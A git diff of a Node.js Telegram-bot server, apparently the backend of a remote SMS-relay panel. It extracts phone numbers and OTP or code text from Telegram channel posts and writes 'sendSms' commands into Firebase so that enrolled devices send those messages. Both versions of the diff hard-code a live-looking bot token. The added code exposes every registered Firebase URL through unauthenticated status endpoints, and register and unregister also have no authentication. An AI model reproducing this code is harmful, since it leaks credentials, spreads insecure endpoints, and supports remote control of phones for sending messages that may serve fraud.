@@ -6,24 +6,20 @@ const http = require('http');
 const https = require('https');
 const { Telegraf } = require('telegraf');
 
-// 🚀 Keep-Alive agents — Firebase write 50-70ms faster hoga
+// Keep-Alive for speed
 const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 100 });
 const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 100 });
-const axiosInstance = axios.create({
-    httpAgent,
-    httpsAgent,
-    timeout: 10000
-});
+const axiosInstance = axios.create({ httpAgent, httpsAgent, timeout: 10000 });
 
 const PORT = process.env.PORT || 3000;
-const BOT_TOKEN = '8951263426:AAHwMiQZY_QIuiHR17_rDNON9zwg-dT3mPc';
+const BOT_TOKEN = '8928344876:AAHhu5s2eAsfIQmOLjdjuwy_-JRD0fruwNA';
 const DATA_FILE = '/app/data/data.json';
 
 let store = { users: {} };
 let processed = new Set();
 let cfgCache = {};
-const CFG_TTL = 300000;              // 5 minute cache
-const CFG_REFRESH_INTERVAL = 15000;  // 15s background refresh
+const CFG_TTL = 300000;
+const CFG_REFRESH_INTERVAL = 15000;
 
 function load() {
     try {
@@ -35,6 +31,8 @@ function load() {
 
 function save() {
     try {
+        const dir = path.dirname(DATA_FILE);
+        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
         fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2));
     } catch (e) { console.error('Save error:', e.message); }
 }
@@ -51,6 +49,7 @@ app.get('/', function (req, res) {
     else res.send('panel.html missing');
 });
 
+// ⭐ Register — har naya user yahan se aata hai
 app.post('/api/register', function (req, res) {
     const u = req.body.firebaseUrl;
     if (!u) return res.status(400).json({ error: 'missing url' });
@@ -60,11 +59,23 @@ app.post('/api/register', function (req, res) {
     save();
 
     refreshCfg(clean).then(function (cfg) {
-        console.log('Registered & config loaded:', clean);
+        console.log('✅ Registered:', clean);
     }).catch(function () {
-        console.log('Registered (config pending):', clean);
+        console.log('✅ Registered (pending):', clean);
     });
 
+    res.json({ ok: true });
+});
+
+// ⭐ Unregister — panel se logout karne pe
+app.post('/api/unregister', function (req, res) {
+    const u = req.body.firebaseUrl;
+    if (!u) return res.status(400).json({ error: 'missing url' });
+    const clean = u.replace(/\/$/, '');
+    delete store.users[clean];
+    delete cfgCache[clean];
+    save();
+    console.log('🗑️ Unregistered:', clean);
     res.json({ ok: true });
 });
 
@@ -72,7 +83,8 @@ app.get('/api/status', function (req, res) {
     res.json({
         ok: true,
         users: Object.keys(store.users).length,
-        cached: Object.keys(cfgCache).length
+        cached: Object.keys(cfgCache).length,
+        userList: Object.keys(store.users)
     });
 });
 
@@ -87,18 +99,13 @@ app.post('/api/notify-channel', async function (req, res) {
         if (!channel) return res.json({ ok: false, error: 'no channel' });
 
         const msg = action === 'on'
-            ? ('✅ Token CHALU\n📱 Device: ' + deviceName + '\n📶 SIM: ' + (sim + 1))
-            : ('❌ Token BAND\n📱 Device: ' + deviceName);
+            ? ('✅ Token CHALU\n📱 Device: ' + deviceName + '\n📶 SIM: ' + (sim + 1) + '\n🔗 ' + firebaseUrl)
+            : ('❌ Token BAND\n📱 Device: ' + deviceName + '\n🔗 ' + firebaseUrl);
 
         await bot.telegram.sendMessage(channel, msg);
 
         if (firebaseUrl) {
             await refreshCfg(firebaseUrl.replace(/\/$/, ''));
-        }
-
-        const users = Object.keys(store.users);
-        for (const u of users) {
-            await refreshCfg(u).catch(function () {});
         }
 
         res.json({ ok: true });
@@ -109,35 +116,24 @@ app.post('/api/notify-channel', async function (req, res) {
 });
 
 app.listen(PORT, '0.0.0.0', function () {
-    console.log('Server running on port ' + PORT);
-    console.log('🚀 HTTP Keep-Alive enabled');
+    console.log('🚀 Server on port ' + PORT + ' | Keep-Alive ON');
     Object.keys(store.users).forEach(function (u) {
         refreshCfg(u).catch(function () {});
     });
 });
 
-// 🚀 Using axiosInstance with Keep-Alive
 async function fbGet(url, p) {
     try {
-        const r = await axiosInstance.get(
-            url.replace(/\/$/, '') + '/' + p + '.json'
-        );
+        const r = await axiosInstance.get(url.replace(/\/$/, '') + '/' + p + '.json');
         return r.data;
-    } catch (e) {
-        return null;
-    }
+    } catch (e) { return null; }
 }
 
 async function fbPut(url, p, data) {
     try {
-        const r = await axiosInstance.put(
-            url.replace(/\/$/, '') + '/' + p + '.json',
-            data
-        );
+        const r = await axiosInstance.put(url.replace(/\/$/, '') + '/' + p + '.json', data);
         return r.status === 200;
-    } catch (e) {
-        return false;
-    }
+    } catch (e) { return false; }
 }
 
 function getCfg(u) {
@@ -152,12 +148,9 @@ function refreshCfg(u) {
             cfgCache[u] = { cfg: cfg, at: Date.now() };
             return cfg;
         })
-        .catch(function () {
-            return null;
-        });
+        .catch(function () { return null; });
 }
 
-// Background refresh
 setInterval(function () {
     Object.keys(store.users).forEach(function (u) {
         refreshCfg(u).catch(function () {});
@@ -168,7 +161,6 @@ const bot = new Telegraf(BOT_TOKEN);
 
 function extract(text) {
     if (!text) return null;
-
     var patterns = [
         /To\s*(?:\(Tap to copy\))?\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
         /Receipt\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
@@ -176,7 +168,6 @@ function extract(text) {
         /Phone\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
         /Mobile\s*[:\-]?[\s\n]*\+?(\d{10,12})/i
     ];
-
     var number = null;
     for (var i = 0; i < patterns.length; i++) {
         var m = text.match(patterns[i]);
@@ -192,7 +183,6 @@ function extract(text) {
         /OTP\s*[:\-]?[\s\n]*([\s\S]+)/i,
         /Code\s*[:\-]?[\s\n]*([\s\S]+)/i
     ];
-
     var message = null;
     for (var j = 0; j < bodyPatterns.length; j++) {
         var b = text.match(bodyPatterns[j]);
@@ -202,12 +192,7 @@ function extract(text) {
         }
     }
     if (!message) return null;
-
     return { number: number, message: message };
-}
-
-function cleanNumber(num) {
-    return String(num).trim();
 }
 
 bot.on('channel_post', async function (ctx) {
@@ -218,88 +203,61 @@ bot.on('channel_post', async function (ctx) {
 
     if (!text) return;
 
-    console.log('\n=== NEW MSG ===');
-    console.log('Chat:', chatId, 'MsgId:', msgId);
-    console.log('Text:', JSON.stringify(text.slice(0, 200)));
-
     const tok = extract(text);
-    if (!tok) {
-        console.log('No token extracted');
-        return;
-    }
+    if (!tok) return;
 
     const globalKey = chatId + '_' + msgId;
-    if (processed.has(globalKey)) {
-        console.log('Duplicate, skipping');
-        return;
-    }
+    if (processed.has(globalKey)) return;
     processed.add(globalKey);
+    if (processed.size > 5000) processed = new Set(Array.from(processed).slice(-2000));
 
-    if (processed.size > 5000) {
-        processed = new Set(Array.from(processed).slice(-2000));
-    }
-
-    console.log('Extracted number:', tok.number);
-    console.log('Extracted message:', JSON.stringify(tok.message.slice(0, 100)));
+    console.log('\n=== NEW MSG ===');
+    console.log('Chat:', chatId, 'MsgId:', msgId);
+    console.log('Number:', tok.number);
 
     const urls = Object.keys(store.users);
     console.log('Checking', urls.length, 'users');
 
-    // 🚀 PARALLEL sending — sab users ko ek saath
+    // ⭐ PARALLEL: Har user ka config check karo
     await Promise.all(urls.map(async function (fbUrl) {
         try {
             let cfg = getCfg(fbUrl);
-
             if (!cfg) {
                 cfg = cfgCache[fbUrl] ? cfgCache[fbUrl].cfg : null;
                 refreshCfg(fbUrl).catch(function () {});
             }
+            if (!cfg) cfg = await refreshCfg(fbUrl);
+            if (!cfg) return;
 
-            if (!cfg) {
-                cfg = await refreshCfg(fbUrl);
-            }
-
-            if (!cfg) {
-                console.log('No config for', fbUrl);
-                return;
-            }
-
-            if (!cfg.channels || cfg.channels.indexOf(chatId) === -1) {
-                return;
-            }
+            // ⭐ SIRF us user ko bhejo jiska channel match kare
+            if (!cfg.channels || cfg.channels.indexOf(chatId) === -1) return;
 
             let targetDevice = null;
             let simSlot = 0;
 
+            // Naya per-device structure
             if (cfg.devices && typeof cfg.devices === 'object') {
-                const enabledDevices = Object.entries(cfg.devices)
-                    .filter(([id, d]) => d && d.enabled === true);
-
-                if (enabledDevices.length > 0) {
-                    targetDevice = enabledDevices[0][0];
-                    simSlot = enabledDevices[0][1].simSlot != null
-                        ? enabledDevices[0][1].simSlot
-                        : 0;
+                const enabled = Object.entries(cfg.devices).filter(([id, d]) => d && d.enabled === true);
+                if (enabled.length > 0) {
+                    targetDevice = enabled[0][0];
+                    simSlot = enabled[0][1].simSlot != null ? enabled[0][1].simSlot : 0;
                 }
             }
 
+            // Legacy fallback
             if (!targetDevice && cfg.tokenEnabled && cfg.tokenDevice) {
                 targetDevice = cfg.tokenDevice;
                 simSlot = cfg.tokenSim || 0;
             }
 
-            if (!targetDevice) {
-                return;
-            }
+            if (!targetDevice) return;
 
-            const clean = cleanNumber(tok.number);
+            const clean = String(tok.number).trim();
             const ts = Date.now();
 
-            console.log('Sending to device:', targetDevice, 'SIM:', simSlot);
+            console.log('✅ MATCH! Sending to device:', targetDevice, 'SIM:', simSlot, '| Firebase:', fbUrl);
 
-            // ⏱️ Firebase write timing
             const fbStart = Date.now();
-
             await fbPut(fbUrl, 'clients/' + targetDevice + '/webhookEvent/sendSms', {
                 to: clean,
                 message: tok.message,
@@ -309,29 +267,24 @@ bot.on('channel_post', async function (ctx) {
                 simInfo: { simSlot: simSlot },
                 fromToken: true
             });
-
             const fbTime = Date.now() - fbStart;
-            console.log('⚡ Firebase write: ' + fbTime + 'ms');
-
-            const elapsed = Date.now() - start;
 
             const reply = '✅ SMS Bhej diya\n\n' +
                 '📱 Device: ' + targetDevice + '\n' +
                 '📞 To: ' + clean + '\n' +
                 '📶 SIM: ' + (simSlot + 1) + '\n' +
                 '⚡ Firebase: ' + fbTime + 'ms\n' +
-                '⏱️ Total: ' + elapsed + 'ms\n\n' +
+                '🔗 ' + fbUrl + '\n\n' +
                 '📝 Body:\n' + tok.message;
 
-            // Fire-and-forget reply
             bot.telegram.sendMessage(chatId, reply, {
                 reply_to_message_id: msgId
-            }).catch(function (e) { console.log('Reply error:', e.message); });
+            }).catch(function () {});
 
-            console.log('✅ Sent to', clean, '| Firebase:', fbTime + 'ms | Total:', elapsed + 'ms');
+            console.log('✅ Sent | Firebase:', fbTime + 'ms');
 
         } catch (e) {
-            console.error('Error processing', fbUrl, ':', e.message);
+            console.error('Error:', fbUrl, e.message);
         }
     }));
 });
@@ -346,7 +299,7 @@ bot.command('start', function (ctx) {
 
 bot.command('status', function (ctx) {
     const users = Object.keys(store.users);
-    ctx.reply('Users: ' + users.length + '\nCached: ' + Object.keys(cfgCache).length);
+    ctx.reply('Users: ' + users.length + '\n' + users.join('\n'));
 });
 
 bot.launch()
